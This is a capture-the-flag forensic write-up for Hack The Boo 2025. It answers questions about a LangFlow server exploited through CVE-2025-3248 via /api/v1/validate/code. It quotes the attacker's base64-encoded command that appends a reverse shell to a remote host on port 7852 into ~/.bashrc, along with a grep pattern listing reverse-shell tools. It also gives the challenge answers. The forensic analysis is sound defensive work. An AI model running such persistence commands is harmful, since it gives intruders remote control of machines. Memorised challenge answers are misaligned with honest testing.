# Hack The Boo 2025 - Competition - Forensic

<img width="544" height="365" alt="image" src="https://github.com/user-attachments/assets/d752de51-9181-4d59-80c8-ed886cbfc516" />

> ***What is the LangFlow version in use? (e.g. 1.5.7)***
> 

<img width="1375" height="324" alt="image" src="https://github.com/user-attachments/assets/f6d6d61a-df8d-4dc0-94df-bbc60e6608eb" />

Answer : **1.2.0**

> ***What is the CVE assigned to this LangFlow vulnerability? (e.g. CVE-2025-12345)***
> 

you can do some googling and get the answer right away

<img width="731" height="321" alt="image" src="https://github.com/user-attachments/assets/cb9fa234-684d-417d-998e-e681f0a17815" />

Answer : **CVE-2025-3248**

***What is the name of the API endpoint exploited by the attacker to execute commands on the system? (e.g. /api/v1/health)*** 

<img width="1369" height="306" alt="image" src="https://github.com/user-attachments/assets/34871d01-a1e3-481c-92b7-0662e30d0802" />

 Answer:   `/api/v1/validate/code`

**Why:** the pcap shows *POST* requests to `/api/v1/validate/code` (multiple times). an endpoint named `validate/code` is the natural place an attacker would POST code to be run — so it’s the best candidate for the API used to execute commands.

***What is the IP address of the attacker? (format: x.x.x.x)***

<img width="1371" height="78" alt="image" src="https://github.com/user-attachments/assets/e9a0ccfc-1243-4bc2-b25d-dc2c498d00cc" />

I used that commad for print IP(s) that made the POSTs to the exploit endpoint

This finds the source IPs that sent `POST` requests to `/api/v1/validate/code` and counts them (the attacker is usually the IP that sent those POSTs):

Answer: **188.114.96.12**

***The attacker used a persistence technique, what is the port used by the reverse shell? (e.g. 4444)***

im using 

```php
┌──(kali㉿kali)-[~/Desktop/tld]
└─$ echo "==== quick grep for reverse shell signs and port numbers ===="
grep -RIn --color -E "nc -l|nc -e|ncat|socat|bash -i|/dev/tcp|python -c|perl -e|mkfifo|bash -c|sh -i|0<&|exec .*<>/dev/tcp|listen|PORT|port|[0-9]{2,5}" decoded_payloads || true

echo
echo "==== print decoded payloads for manual inspection ===="
for f in decoded_payloads/*.py; do
  echo
  echo "----- $f -----"
  sed -n '1,240p' "$f"
done
```

<img width="1392" height="623" alt="image" src="https://github.com/user-attachments/assets/1eecdb25-4bba-4d80-84f9-8236667ca67b" />

**Why (evidence):**

- In the decoded payloads (`decoded_payloads/payload_4.py` and `payload_8.py`) you have this command embedded:

```
echo c2ggLWkgPiYgL2Rldi90Y3AvMTMxLjAuNzIuMC83ODUyIDA+JjE=|base64 --decode >> ~/.bashrc
```

- Base64-decoding `c2ggLWkgPiYgL2Rldi90Y3AvMTMxLjAuNzIuMC83ODUyIDA+JjE=` yields:

<img width="1358" height="101" alt="image" src="https://github.com/user-attachments/assets/6fced196-e9de-4938-8944-696f83f90264" />

Answer:**7852** 

> **What is the system machine hostname? (e.g. server01)**
> 

<img width="1389" height="454" alt="image" src="https://github.com/user-attachments/assets/56404925-77fa-4e13-a3a0-715958557859" />

I try submit aisrv01 since seing the hostname there

Answer: **aisrv01**

> What is the Postgres password used by LangFlow? (e.g. Password123)
> 

<img width="1373" height="276" alt="image" src="https://github.com/user-attachments/assets/81317019-93ef-4dfe-8ab6-aa21ffe42eb0" />

Answer:**LnGFlWPassword2025**
